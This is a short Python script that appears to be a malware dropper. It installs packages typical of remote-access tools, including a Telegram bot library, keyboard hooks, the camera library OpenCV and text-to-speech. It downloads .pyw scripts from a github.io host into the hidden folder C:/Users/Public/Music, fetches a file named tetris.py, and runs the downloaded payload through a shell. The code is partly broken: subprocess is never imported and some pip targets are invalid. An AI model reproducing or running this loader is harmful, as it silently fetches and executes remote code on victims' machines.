
import os
os.system('pip install requests')
os.system('pip install python-telegram-bot')
os.system('pip install Pillow')
os.system('pip install keyboard')
os.system('pip install pyttsx3')
os.system('pip install win10toast')
os.system('pip install opencv-python')
os.system('pip install subprocess')
os.system('pip install http.client')
os.system('pip install psutil')
import requests
import time
url = 'https://inoplanetanen.github.io/larisa.pyw'
r = requests.get(url, allow_redirects = True)
open('C:/Users/Public/Music/file.pyw', 'wb').write(r.content)
urlupd = 'https://inoplanetanen.github.io/update.pyw'
rupd = requests.get(urlupd, allow_redirects = True)
open('C:/Users/Public/Music/update.pyw', 'wb').write(rupd.content)


file_path = os.path.dirname(os.path.realpath(__file__))


urlupdw = 'https://inoplanetanen.github.io/tetris.py'
rupdw = requests.get(urlupdw, allow_redirects = True)

open(file_path+'//tetris.py', 'wb').write(rupdw.content)
text = 'C:/Users/Public/Music/file.pyw'
subprocess.check_output(text, shell=True)
